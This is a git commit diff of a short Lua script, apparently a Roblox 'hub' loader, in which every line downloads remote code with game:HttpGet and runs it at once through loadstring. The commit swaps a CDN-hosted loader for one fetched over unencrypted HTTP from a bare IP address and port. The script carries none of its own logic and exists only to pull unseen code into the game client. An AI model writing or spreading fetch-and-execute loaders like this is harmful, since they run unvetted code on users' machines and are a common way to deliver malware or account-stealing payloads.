61ac715c799540cfec04f5f1bd0993f809d18276
LuckyEgg <paxhoneyspark@gmail.com>
2025-09-07 21:01:59 +0800

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,4 +1,4 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LuckyEgg-V1/LuckyEgg_Hub/refs/heads/main/extras.lua", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LuckyEgg-V1/LuckyEgg_Hub/refs/heads/main/roller.lua", true))()
 ID="848733db-fe3a-47aa-81dd-ce8226165fcc";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
